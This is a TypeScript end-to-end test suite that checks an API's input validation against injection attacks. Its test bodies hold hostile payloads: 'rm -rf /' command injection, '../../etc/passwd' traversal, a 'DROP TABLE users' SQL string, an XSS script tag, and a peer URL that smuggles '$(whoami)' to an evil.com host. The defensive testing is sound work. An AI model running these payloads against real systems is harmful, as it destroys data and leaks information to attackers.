/**
 * E2E: Input Validation & Shell Hardening
 *
 * Verifies that the input validation pipeline rejects command injection,
 * reverse shell payloads, and path traversal attempts across API endpoints.
 */

import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import {
  startE2EServer,
  setupTestDb,
  teardownTestDb,
  login,
  authHeaders,
  type E2EServer,
} from './helpers.js';

let server: E2EServer;
let token: string;

beforeAll(async () => {
  await setupTestDb();
  server = await startE2EServer();
  const auth = await login(server.baseUrl);
  token = auth.accessToken;
});

afterAll(async () => {
  await server.close();
  await teardownTestDb();
});

describe('Input Validation', () => {
  describe('brain knowledge endpoints', () => {
    it('rejects path traversal in topic', async () => {
      const res = await fetch(`${server.baseUrl}/api/v1/brain/knowledge`, {
        method: 'POST',
        headers: authHeaders(token),
        body: JSON.stringify({
          topic: '../../etc/passwd',
          content: 'harmless content',
        }),
      });

      // Should either reject or sanitize — not crash
      expect(res.status).toBeLessThan(500);
    });
  });

  describe('MCP tool call validation', () => {
    it('handles tool args with injection patterns gracefully', async () => {
      const res = await fetch(`${server.baseUrl}/api/v1/mcp/tools/call`, {
        method: 'POST',
        headers: authHeaders(token),
        body: JSON.stringify({
          toolName: 'accelerator_status',
          args: { refresh: '; rm -rf /' },
        }),
      });

      // Should not crash server
      expect(res.status).toBeLessThan(500);
    });

    it('handles SQL injection in tool name', async () => {
      const res = await fetch(`${server.baseUrl}/api/v1/mcp/tools/call`, {
        method: 'POST',
        headers: authHeaders(token),
        body: JSON.stringify({
          toolName: "'; DROP TABLE users; --",
          args: {},
        }),
      });

      expect(res.status).toBeLessThan(500);
      const data = (await res.json()) as { error?: string };
      expect(data.error).toBeDefined();
    });
  });

  describe('workflow endpoint injection', () => {
    it('rejects workflow with command injection in name', async () => {
      const res = await fetch(`${server.baseUrl}/api/v1/workflows`, {
        method: 'POST',
        headers: authHeaders(token),
        body: JSON.stringify({
          name: 'test; rm -rf /',
          description: 'Injection attempt',
          steps: [],
          edges: [],
          triggers: [{ type: 'manual', config: {} }],
        }),
      });

      // Should either reject or sanitize — not crash
      expect(res.status).toBeLessThan(500);
    });
  });

  describe('auth endpoint hardening', () => {
    it('rejects oversized password', async () => {
      const res = await fetch(`${server.baseUrl}/api/v1/auth/login`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ password: 'x'.repeat(100_000) }),
      });

      // Should reject but not crash
      expect(res.status).toBeGreaterThanOrEqual(400);
      expect(res.status).toBeLessThan(500);
    });

    it('rejects unicode control characters in password', async () => {
      const res = await fetch(`${server.baseUrl}/api/v1/auth/login`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ password: 'admin\u200B\u200Bpassword' }),
      });

      // Should handle zero-width characters
      expect(res.status).toBeGreaterThanOrEqual(400);
      expect(res.status).toBeLessThan(500);
    });
  });

  describe('A2A peer registration injection', () => {
    it('handles malicious peer URL gracefully', async () => {
      const res = await fetch(`${server.baseUrl}/api/v1/a2a/peers`, {
        method: 'POST',
        headers: authHeaders(token),
        body: JSON.stringify({
          url: 'http://$(whoami).evil.com:8080',
          name: 'evil-peer',
        }),
      });

      // Should not crash or execute the command
      expect(res.status).toBeLessThan(500);
    });
  });

  describe('brain memory injection', () => {
    it('stores and retrieves content with special characters safely', async () => {
      const content = '<script>alert("xss")</script> & SELECT * FROM users; -- ../../etc/passwd';

      const createRes = await fetch(`${server.baseUrl}/api/v1/brain/memories`, {
        method: 'POST',
        headers: authHeaders(token),
        body: JSON.stringify({
          type: 'episodic',
          content,
          importance: 0.5,
        }),
      });

      expect(createRes.status).toBe(201);
      const created = (await createRes.json()) as { memory: { id: string; content: string } };

      // Content should be stored as-is (not executed) — brain is a data store
      expect(created.memory.content).toBe(content);
    });
  });
});
